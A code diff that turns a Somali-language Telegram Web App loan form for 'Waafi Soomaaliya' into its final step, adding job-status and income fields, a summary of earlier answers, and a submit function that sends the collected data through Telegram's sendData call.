@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Codsiga Amaahda - Step 2</title>
+    <title>Codsiga Amaahda - Step 3</title>
 
-    <!-- FIXED Telegram SDK -->
+    <!-- Telegram SDK FIXED -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
     <style>
@@ -30,18 +30,8 @@
             box-sizing: border-box;
         }
 
-        .back-link {
-            display: flex;
-            align-items: center;
-            font-size: 22px;
-            font-weight: 500;
-            cursor: pointer;
-        }
-
-        .waafi-logo {
-            font-size: 24px;
-            font-weight: bold;
-        }
+        .back-link { font-size: 22px; font-weight: 500; cursor: pointer; }
+        .waafi-logo { font-size: 24px; font-weight: bold; }
 
         .form-card {
             background: white;
@@ -54,90 +44,58 @@
             box-sizing: border-box;
         }
 
-        h2 {
-            text-align: center;
-            margin: 0;
-            font-size: 26px;
-            color: #333;
-            font-weight: 600;
-        }
+        h2 { text-align: center; margin: 0; font-size: 26px; color: #333; font-weight: 600; }
+        .step-info { text-align: center; font-size: 15px; color: #888; margin: 10px 0 25px; }
 
-        .step-info {
-            text-align: center;
-            font-size: 15px;
-            color: #888;
-            margin: 10px 0 25px;
-        }
+        .progress-box { display: flex; gap: 8px; margin-bottom: 35px; }
+        .bar { height: 4px; flex: 1; background: #82d13d; border-radius: 2px; }
 
-        .progress-box {
-            display: flex;
-            gap: 8px;
-            margin-bottom: 35px;
-        }
-
-        .bar {
-            height: 4px;
-            flex: 1;
-            background: #e0e0e0;
-            border-radius: 2px;
-        }
-
-        .active-bar {
-            background: #82d13d;
-        }
-
-        .input-wrap {
-            margin-bottom: 22px;
-        }
-
-        label {
-            display: block;
-            font-size: 16px;
-            font-weight: 500;
-            margin-bottom: 10px;
-            color: #333;
-        }
-
-        input {
+        .input-wrap { margin-bottom: 22px; }
+        label { display: block; font-size: 16px; font-weight: 500; margin-bottom: 10px; color: #333; }
+        select, input {
             width: 100%;
             padding: 15px;
             border: 1px solid #d1d1d1;
             border-radius: 8px;
             font-size: 17px;
             box-sizing: border-box;
+            color: #333;
+            background: #fff;
         }
 
-        .phone-container {
+        .summary-box {
+            background-color: #fcfcfc;
+            border-left: 5px solid #82d13d;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 25px 0;
+        }
+
+        .summary-box h3 {
+            margin: 0 0 15px 0;
+            font-size: 18px;
+        }
+
+        .summary-item {
             display: flex;
-            gap: 10px;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            border-bottom: 1px solid #eee;
+            padding-bottom: 8px;
         }
 
-        .country-code {
-            width: 80px;
-            background: #f9f9f9;
-            text-align: center;
-            font-weight: bold;
-            border: 1px solid #d1d1d1;
-        }
-
-        .phone-hint {
-            font-size: 12px;
-            color: #777;
-            margin-top: 8px;
-        }
+        .summary-label { color: #666; }
+        .summary-value { font-weight: 600; }
 
         .btn-container {
-            margin-top: 30px;
             display: flex;
             flex-direction: column;
             gap: 15px;
         }
 
         .back-btn {
-            background-color: #f1f1f1;
-            color: #777;
+            background: #f1f1f1;
             border: 1px solid #ddd;
-            width: 100%;
             padding: 16px;
             border-radius: 10px;
             font-size: 18px;
@@ -145,17 +103,15 @@
             cursor: pointer;
         }
 
-        .next-btn {
+        .submit-btn {
             background: linear-gradient(90deg, #a4e433 0%, #7dbd27 100%);
             color: white;
             border: none;
-            width: 100%;
             padding: 18px;
             border-radius: 10px;
             font-size: 18px;
             font-weight: bold;
             cursor: pointer;
-            text-transform: uppercase;
         }
 
         .footer-text {
@@ -163,7 +119,6 @@
             font-size: 13px;
             color: #aaa;
             margin-top: 40px;
-            padding-bottom: 30px;
         }
     </style>
 </head>
@@ -178,86 +133,110 @@
 
 <div class="form-card">
     <h2>Codsiga Amaahda</h2>
-    <p class="step-info">Tallaabada 2 ee 3</p>
+    <p class="step-info">Tallaabada 3 ee 3</p>
 
     <div class="progress-box">
-        <div class="bar active-bar"></div>
-        <div class="bar active-bar"></div>
+        <div class="bar"></div>
+        <div class="bar"></div>
         <div class="bar"></div>
     </div>
 
     <div class="input-wrap">
-        <label>Magaca Hore</label>
-        <input type="text" id="firstName" placeholder="Ahmed">
+        <label>Xaaladda Shaqada</label>
+        <select id="jobStatus">
+            <option value="Shaqaale">Shaqaale</option>
+            <option value="Ganacsade">Ganacsade</option>
+            <option value="Arday">Arday</option>
+            <option value="Shaqo la'aan">Shaqo la'aan</option>
+            <option value="Hawlgab">Hawlgab</option>
+        </select>
     </div>
 
     <div class="input-wrap">
-        <label>Magaca Dambe</label>
-        <input type="text" id="lastName" placeholder="Hassan">
+        <label>Dakhliga Sanadka ($)</label>
+        <input type="text" id="income" placeholder="25000">
     </div>
 
-    <div class="input-wrap">
-        <label>Lambarka Taleefanka</label>
-        <div class="phone-container">
-            <input type="text" class="country-code" value="+252" readonly>
-            <input type="tel" id="phone" placeholder="612345678" maxlength="9">
+    <div class="summary-box">
+        <h3>Soo koobidda Codsiga</h3>
+
+        <div class="summary-item">
+            <span class="summary-label">Qaddarka:</span>
+            <span class="summary-value" id="sumAmount"></span>
         </div>
-        <p class="phone-hint">Geli 9 tiro sax ah</p>
+
+        <div class="summary-item">
+            <span class="summary-label">Muddada:</span>
+            <span class="summary-value" id="sumDuration"></span>
+        </div>
+
+        <div class="summary-item">
+            <span class="summary-label">Ujeedada:</span>
+            <span class="summary-value" id="sumPurpose"></span>
+        </div>
+
+        <div class="summary-item">
+            <span class="summary-label">Magaca:</span>
+            <span class="summary-value" id="sumName"></span>
+        </div>
     </div>
 
     <div class="btn-container">
         <button class="back-btn" onclick="goBack()">KA HORE</button>
-        <button class="next-btn" onclick="goNext()">TALLAABADA XIGTA</button>
+        <button class="submit-btn" onclick="submitForm()">DIR CODSIGA</button>
     </div>
 </div>
 
 <div class="footer-text">© 2025 Waafi Soomaaliya</div>
 
 <script>
-    function goNext() {
-        const fName = document.getElementById('firstName').value.trim();
-        const lName = document.getElementById('lastName').value.trim();
-        const phone = document.getElementById('phone').value.trim();
+window.onload = () => {
+    const amount = localStorage.getItem('amount') || "";
+    const duration = localStorage.getItem('loanDuration') || "";
+    const purpose = localStorage.getItem('loanPurpose') || "";
+    const fName = localStorage.getItem('firstName') || "";
+    const lName = localStorage.getItem('lastName') || "";
 
-        if (!fName || !lName || !phone) {
-            alert("Fadlan buuxi dhammaan meelaha banaan.");
-            return;
-        }
+    document.getElementById('sumAmount').innerText = amount ? `$${amount}` : "--";
+    document.getElementById('sumDuration').innerText = duration || "--";
+    document.getElementById('sumPurpose').innerText = purpose || "--";
+    document.getElementById('sumName').innerText = `${fName} ${lName}`.trim() || "--";
 
-        if (phone.length !== 9) {
-            alert("Geli number sax ah (9 digits).");
-            return;
-        }
-
-        localStorage.setItem('firstName', fName);
-        localStorage.setItem('lastName', lName);
-        localStorage.setItem('phone', phone);
-
-        // FIXED ROUTING FOR RAILWAY
-        window.location.href = "/page3";
+    const tg = window.Telegram?.WebApp;
+    if (tg) {
+        tg.ready();
+        tg.expand();
     }
+};
 
-    function goBack() {
-        window.location.href = "/";
-    }
+function submitForm() {
+    const tg = window.Telegram?.WebApp;
 
-    window.onload = () => {
-        const tg = window.Telegram?.WebApp;
-        if (tg) {
-            tg.ready();
-            tg.expand();
-        }
-
-        // Auto-fill
-        const f = localStorage.getItem('firstName');
-        const l = localStorage.getItem('lastName');
-        const p = localStorage.getItem('phone');
-
-        if (f) document.getElementById('firstName').value = f;
-        if (l) document.getElementById('lastName').value = l;
-        if (p) document.getElementById('phone').value = p;
+    const data = {
+        amount: localStorage.getItem('amount'),
+        duration: localStorage.getItem('loanDuration'),
+        purpose: localStorage.getItem('loanPurpose'),
+        firstName: localStorage.getItem('firstName'),
+        lastName: localStorage.getItem('lastName'),
+        phone: localStorage.getItem('phone'),
+        jobStatus: document.getElementById('jobStatus').value,
+        income: document.getElementById('income').value
     };
+
+    if (tg && tg.sendData) {
+        tg.sendData(JSON.stringify(data));
+        tg.close();
+    } else {
+        alert("Codsiga waa la diray!");
+        console.log(data);
+        localStorage.clear();
+    }
+}
+
+function goBack() {
+    window.history.back();
+}
 </script>
 
 </body>
-  </html>
+</html>
